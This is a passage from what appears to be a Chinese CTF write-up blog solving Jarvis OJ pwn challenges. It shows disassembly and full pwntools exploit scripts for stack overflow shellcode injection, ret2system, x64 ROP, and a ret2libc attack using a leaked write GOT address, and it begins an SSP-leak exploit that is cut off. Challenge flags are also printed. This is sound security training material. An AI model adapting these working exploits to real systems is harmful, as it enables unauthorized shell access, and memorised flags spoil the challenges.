class="line">.text:080484B1                 add     esp, 10h</span><br><span class="line">.text:080484B4                 nop</span><br><span class="line">.text:080484B5                 leave</span><br><span class="line">.text:080484B6                 retn</span><br><span class="line">.text:080484B6 vulnerable_function endp</span><br></pre></td></tr></table></figure>
<p>这个函数有问题，首先他会打印出我们写进去的值的局部变量的首地址，然后会向这个地址写入会造成栈溢出的内容。</p>
<p>所以只要先获取到栈地址，然后只要按照shellcode.sh+n*nop+ret_address的格式发送shellcode就能获取shell。</p>
<p>poc如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cn=process('./level1')</span></span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9877</span>)</span><br><span class="line"></span><br><span class="line">p_buf = int(cn.recv()[<span class="number">-10</span>:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(p_buf)</span><br><span class="line">sh = asm(shellcraft.i386.sh())</span><br><span class="line">cn.send(sh+(<span class="number">0x8c</span>-len(sh))*<span class="string">'\x90'</span>+p32(p_buf))</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>cat flag得：<code>CTF{82c2aa534a9dede9c3a0045d0fec8617}</code></p>
<h2 id="PWN-XMAN-level2"><a href="#PWN-XMAN-level2" class="headerlink" title="PWN - [XMAN]level2"></a>PWN - [XMAN]level2</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9878</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level2.54931449c557d0551c4fc2a10f4778a1" target="_blank" rel="noopener">level2.54931449c557d0551c4fc2a10f4778a1</a></p>
</blockquote>
<p>首先还是看一下开了那些保护：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_4d7fc09e2246c464d42e377449104a6b.png" alt=""></p>
<p>发现开了NX保护，那之前在栈上写入shellcode的方法就不可行了。</p>
<p>还是先看代码：</p>
<p>main函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048480 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048480                 public main</span><br><span class="line">.text:08048480 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line">.text:08048480</span><br><span class="line">.text:08048480 var_4           = dword ptr -4</span><br><span class="line">.text:08048480 argc            = dword ptr  0Ch</span><br><span class="line">.text:08048480 argv            = dword ptr  10h</span><br><span class="line">.text:08048480 envp            = dword ptr  14h</span><br><span class="line">.text:08048480</span><br><span class="line">.text:08048480                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048484                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08048487                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804848A                 push    ebp</span><br><span class="line">.text:0804848B                 mov     ebp, esp</span><br><span class="line">.text:0804848D                 push    ecx</span><br><span class="line">.text:0804848E                 sub     esp, 4</span><br><span class="line">.text:08048491                 call    vulnerable_function</span><br><span class="line">.text:08048496                 sub     esp, 0Ch</span><br><span class="line">.text:08048499                 push    offset aEchoHelloWorld ; &quot;echo &apos;Hello World!&apos;&quot;</span><br><span class="line">.text:0804849E                 call    _system</span><br><span class="line">.text:080484A3                 add     esp, 10h</span><br><span class="line">.text:080484A6                 mov     eax, 0</span><br><span class="line">.text:080484AB                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:080484AE                 leave</span><br><span class="line">.text:080484AF                 lea     esp, [ecx-4]</span><br><span class="line">.text:080484B2                 retn</span><br><span class="line">.text:080484B2 main            endp</span><br></pre></td></tr></table></figure></p>
<p>先执行vulnerable_function函数，然后执行<code>system(&quot;echo &#39;Hello World!&#39;&quot;)</code>。</p>
<p>再看看vulnerable_function函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:0804844B                 public vulnerable_function</span><br><span class="line">.text:0804844B vulnerable_function proc near           ; CODE XREF: main+11p</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B buf             = byte ptr -88h</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B                 push    ebp</span><br><span class="line">.text:0804844C                 mov     ebp, esp</span><br><span class="line">.text:0804844E                 sub     esp, 88h</span><br><span class="line">.text:08048454                 sub     esp, 0Ch</span><br><span class="line">.text:08048457                 push    offset command  ; &quot;echo Input:&quot;</span><br><span class="line">.text:0804845C                 call    _system</span><br><span class="line">.text:08048461                 add     esp, 10h</span><br><span class="line">.text:08048464                 sub     esp, 4</span><br><span class="line">.text:08048467                 push    100h            ; nbytes</span><br><span class="line">.text:0804846C                 lea     eax, [ebp+buf]</span><br><span class="line">.text:08048472                 push    eax             ; buf</span><br><span class="line">.text:08048473                 push    0               ; fd</span><br><span class="line">.text:08048475                 call    _read</span><br><span class="line">.text:0804847A                 add     esp, 10h</span><br><span class="line">.text:0804847D                 nop</span><br><span class="line">.text:0804847E                 leave</span><br><span class="line">.text:0804847F                 retn</span><br><span class="line">.text:0804847F vulnerable_function endp</span><br></pre></td></tr></table></figure>
<p>先执行<code>system(&quot;echo Input:&quot;)</code>，然后是一个read的栈溢出。</p>
<p>但由于开了nx，我们不能在栈上执行我们的shellcode。</p>
<p>但是，我们上面有system函数，我们可以构造字符串，0x8c*’a’+pt_call_system+pt_/bin/sh。</p>
<p>然后我在data段上找到了“/bin/sh”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0804A024                 public hint</span><br><span class="line">.data:0804A024 hint            db &apos;/bin/sh&apos;,0</span><br><span class="line">.data:0804A024 _data           ends</span><br></pre></td></tr></table></figure>
<p>poc如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cn=process('./level2')</span></span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line">cn.recvline()</span><br><span class="line">cn.send(<span class="number">0x8c</span>*<span class="string">'a'</span>+ p32(<span class="number">0x0804845C</span>) + p32(<span class="number">0x0804A024</span>))</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>flag：<code>CTF{1759d0cbd854c54ffa886cd9df3a3d52}</code></p>
<h2 id="PWN-XMAN-level2-x64"><a href="#PWN-XMAN-level2-x64" class="headerlink" title="PWN - [XMAN]level2_x64"></a>PWN - [XMAN]level2_x64</h2><blockquote>
<p>nc pwn2.jarvisoj.com 9882</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e" target="_blank" rel="noopener">level2_x64.04d700633c6dc26afc6a1e7e9df8c94e</a></p>
</blockquote>
<p>和上一题相比，基本没变，就是从32位改成了64位。但就是这个改动，我们就要换方法了。</p>
<p>和之前一样，我们要利用栈溢出来控制eip让他调用<code>system(&quot;\bin\sh&quot;)</code>。但是64位函数的参数传递顺序和32位不同，而是从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9，第七个参数开始才放在栈上。所以我要想办法把<code>\bin\sh</code>的地址放到rdi里。</p>
<p>这里需要用到rop了。</p>
<p>首先推荐4篇文章（我现在还没有全部看完，算是做个笔记吧）</p>
<ul>
<li><a href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x86%E7%AF%87.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x86%E7%AF%87.html</a></li>
<li><a href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html</a></li>
<li><a href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bgadgets%E5%92%8C2free%E7%AF%87.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bgadgets%E5%92%8C2free%E7%AF%87.html</a></li>
<li><a href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BAndroid%20ARM%2032%E4%BD%8D%E7%AF%87.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BAndroid%20ARM%2032%E4%BD%8D%E7%AF%87.html</a></li>
</ul>
<p>用ROPgadget，命令<code>ROPgadget --binary level2_x64 --only &quot;pop|ret&quot; | grep &quot;rdi&quot;</code></p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_41bc5b5b2d9d012e48ba8b7e2ea4e096.png" alt=""></p>
<p>得到地址：0x4006b3</p>
<p>之后的操作和之前差不多。</p>
<p>poc如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cn = process('./level2_x64')</span></span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)</span><br><span class="line">level2_x64 = ELF(<span class="string">'./level2_x64'</span>)</span><br><span class="line">sys = level2_x64.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">p_rop_rdi = p64(<span class="number">0x00000000004006b3</span>)</span><br><span class="line"></span><br><span class="line">cn.recvline()</span><br><span class="line">cn.send(<span class="string">'a'</span>*<span class="number">0x88</span> + p_rop_rdi + p64(<span class="number">0x0000000000600A90</span>) + p64(sys))</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>flag：<code>CTF{081ecc7c8d658409eb43358dcc1cf446}</code></p>
<h2 id="PWN-XMAN-level3"><a href="#PWN-XMAN-level3" class="headerlink" title="PWN - [XMAN]level3"></a>PWN - [XMAN]level3</h2><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9879</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level3.rar.1ce2f904ead905afbadd33de1d0c391d" target="_blank" rel="noopener">level3.rar.1ce2f904ead905afbadd33de1d0c391d</a></p>
</blockquote>
<p>这道题目给了一个libc和程序。</p>
<p>我们先看一下程序开了哪些保护：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">veritas@ubuntu:~/pwn/level0$ pwn checksec level3</span><br><span class="line">[*] &apos;/home/veritas/pwn/level0/level3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure></p>
<p>开了nx保护，那就不能在栈上执行shellcode了。</p>
<p>ida看一下代码：</p>
<p>main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:08048484 ; Attributes: bp-based frame</span><br><span class="line">.text:08048484</span><br><span class="line">.text:08048484 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048484                 public main</span><br><span class="line">.text:08048484 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line">.text:08048484</span><br><span class="line">.text:08048484 var_4           = dword ptr -4</span><br><span class="line">.text:08048484 argc            = dword ptr  0Ch</span><br><span class="line">.text:08048484 argv            = dword ptr  10h</span><br><span class="line">.text:08048484 envp            = dword ptr  14h</span><br><span class="line">.text:08048484</span><br><span class="line">.text:08048484                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048488                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804848B                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804848E                 push    ebp</span><br><span class="line">.text:0804848F                 mov     ebp, esp</span><br><span class="line">.text:08048491                 push    ecx</span><br><span class="line">.text:08048492                 sub     esp, 4</span><br><span class="line">.text:08048495                 call    vulnerable_function</span><br><span class="line">.text:0804849A                 sub     esp, 4</span><br><span class="line">.text:0804849D                 push    0Eh             ; n</span><br><span class="line">.text:0804849F                 push    offset aHelloWorld ; &quot;Hello, World!\n&quot;</span><br><span class="line">.text:080484A4                 push    1               ; fd</span><br><span class="line">.text:080484A6                 call    _write</span><br><span class="line">.text:080484AB                 add     esp, 10h</span><br><span class="line">.text:080484AE                 mov     eax, 0</span><br><span class="line">.text:080484B3                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:080484B6                 leave</span><br><span class="line">.text:080484B7                 lea     esp, [ecx-4]</span><br><span class="line">.text:080484BA                 retn</span><br><span class="line">.text:080484BA main            endp</span><br></pre></td></tr></table></figure>
<p>vulnerable_function函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:0804844B                 public vulnerable_function</span><br><span class="line">.text:0804844B vulnerable_function proc near           ; CODE XREF: main+11p</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B buf             = byte ptr -88h</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B                 push    ebp</span><br><span class="line">.text:0804844C                 mov     ebp, esp</span><br><span class="line">.text:0804844E                 sub     esp, 88h</span><br><span class="line">.text:08048454                 sub     esp, 4</span><br><span class="line">.text:08048457                 push    7               ; n</span><br><span class="line">.text:08048459                 push    offset aInput   ; &quot;Input:\n&quot;</span><br><span class="line">.text:0804845E                 push    1               ; fd</span><br><span class="line">.text:08048460                 call    _write</span><br><span class="line">.text:08048465                 add     esp, 10h</span><br><span class="line">.text:08048468                 sub     esp, 4</span><br><span class="line">.text:0804846B                 push    100h            ; nbytes</span><br><span class="line">.text:08048470                 lea     eax, [ebp+buf]</span><br><span class="line">.text:08048476                 push    eax             ; buf</span><br><span class="line">.text:08048477                 push    0               ; fd</span><br><span class="line">.text:08048479                 call    _read</span><br><span class="line">.text:0804847E                 add     esp, 10h</span><br><span class="line">.text:08048481                 nop</span><br><span class="line">.text:08048482                 leave</span><br><span class="line">.text:08048483                 retn</span><br><span class="line">.text:08048483 vulnerable_function endp</span><br></pre></td></tr></table></figure></p>
<p>思路：这题在程序中没有调用system函数，但是题目给了libc库，我们可以先通过read的溢出执行构造的rop代码，leak运行时libc库中write函数的真实地址，然后根据write和system的相对偏移地址算出system函数的真实地址，rop代码再次return到vulnerable_function，再次溢出，这次执行system，就可以获取shell了。</p>
<p>关于本题如何leakwrite函数的真实地址，是依靠linux中的lazy binding（延迟绑定），大致过程是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一次call write -&gt; write_plt -&gt; 系统初始化去获取write在内存中的地址 -&gt; 写到write_got -&gt; write_plt变成jmp *write_got</span><br></pre></td></tr></table></figure></p>
<p>poc如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment">#cn = process('level3')</span></span><br><span class="line"><span class="comment">#libc = ELF('/lib32/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程</span></span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line"></span><br><span class="line">level3 = ELF(<span class="string">'level3'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv() <span class="comment"># input:</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'bbbb'</span> + p32(level3.symbols[<span class="string">'write'</span>]) + p32(level3.symbols[<span class="string">'vulnerable_function'</span>]) + p32(<span class="number">1</span>) + p32(level3.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># write(1,got['write'],4) -&gt; call vulnerable_function</span></span><br><span class="line">cn.send(payload1)</span><br><span class="line">p_write = u32(cn.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p_system = p_write - libc.symbols[<span class="string">'write'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment"># 计算 system函数的真实地址</span></span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">p_sh = p_write - libc.symbols[<span class="string">'write'</span>] + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="comment"># 计算'/bin/sh'字符串的真实地址</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'bbbb'</span> + p32(p_system) + <span class="string">'bbbb'</span> + p32(p_sh)</span><br><span class="line"><span class="comment"># system('/bin/sh')</span></span><br><span class="line"></span><br><span class="line">cn.send(payload2)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>flag:<code>CTF{d85346df5770f56f69025bc3f5f1d3d0}</code></p>
<hr>
<h2 id="PWN-Smashes"><a href="#PWN-Smashes" class="headerlink" title="PWN - Smashes"></a>PWN - Smashes</h2><p>题目描述：</p>
<blockquote>
<p>Smashes, try your best to smash!!!</p>
</blockquote>
<blockquote>
<p>nc pwn.jarvisoj.com 9877</p>
</blockquote>
<blockquote>
<p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229" target="_blank" rel="noopener">smashes.44838f6edd4408a53feb2e2bbfe5b229</a></p>
</blockquote>
<p>首先查看保护</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn_smashes </span><br><span class="line">[*] <span class="string">'/home/veritas/pwn/jarvisoj/smashes/pwn_smashes'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>有canary，有nx</p>
<p>ida找到关键函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 func_1()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax@1</span><br><span class="line">  __int64 v1; // rbx@2</span><br><span class="line">  int v2; // eax@3</span><br><span class="line">  __int64 buffer; // [sp+0h] [bp-128h]@1</span><br><span class="line">  __int64 canary; // [sp+108h] [bp-20h]@1</span><br><span class="line"></span><br><span class="line">  canary = *MK_FP(__FS__, 40LL);</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Hello!\nWhat&apos;s your name? &quot;);</span><br><span class="line">  LODWORD(v0) = _IO_gets(&amp;buffer);</span><br><span class="line">  if ( !v0 )</span><br><span class="line">label_exit:</span><br><span class="line">    _exit(1);</span><br><span class="line">  v1 = 0LL;</span><br><span class="line">  __printf_chk(1LL, (__int64)&quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = _IO_getc(stdin);</span><br><span class="line">    if ( v2 == -1u )</span><br><span class="line">      goto label_exit;</span><br><span class="line">    if ( v2 == &apos;\n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    flag[v1++] = v2;</span><br><span class="line">    if ( v1 == 32 )                             // 32长度</span><br><span class="line">      goto thank_you;</span><br><span class="line">  &#125;</span><br><span class="line">  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));</span><br><span class="line">thank_you:</span><br><span class="line">  puts(&quot;Thank you, bye!&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ canary;</span><br></pre></td></tr></table></figure>
<p>首先，函数使用了gets<s>(的某种形态？)</s>来获取输入，好处是我们可以输入无限长度的字符串，坏处是发送过去的字符串的尾部会以<code>\n</code>结尾，所以无法绕过canary。</p>
<p>纵观整个程序，似乎没有什么地方能够绕过canary，也没有什么地方能打印flag。</p>
<p>但如果你换个思路，我们故意触发canary的保护会怎么样？</p>
<p>事实上，就有一种攻击方法叫做<code>SSP（Stack Smashing Protector ） leak</code>。</p>
<hr>
<p>如果canary被我们的值覆盖而发生了变化，程序会执行函数<code>___stack_chk_fail()</code></p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_7a0eddd01d532e95ac8a905e617c70b4.png" alt=""></p>
<p>一般情况下，我们执行了这个函数，输出是这样的：</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_c0f71a7d08460009b1ff313dcdbf0294.png" alt=""></p>
<p>我们来看一下源码<br>__stack_chk_fail :<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;   </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>fortify_fail<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p>
<p>可见，__libc_message 的第二个<code>%s</code>输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风</p>
<p><img src="http://ordvwjm69.bkt.clouddn.com/jarvis_wp_a768142147ca3976598941b5c6c67161.png" alt=""></p>
<p>所以，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p>
<p>听起来很美妙，我们可以试试看。</p>
<p>先写如下poc:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cn = remote('pwn.jarvisoj.com', 9877)</span></span><br><span class="line">cn = process(<span class="string">'pwn_smashes'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(p64(<span class="number">0x0000000000400934</span>)*<span class="number">200</span>) <span class="comment">#直接用我们所需的地址占满整个栈</span></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline()</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#.rodata:0000000000400934 aHelloWhatSYour db 'Hello!',0Ah         ; DATA XREF: func_1+1o</span></span><br><span class="line"><span 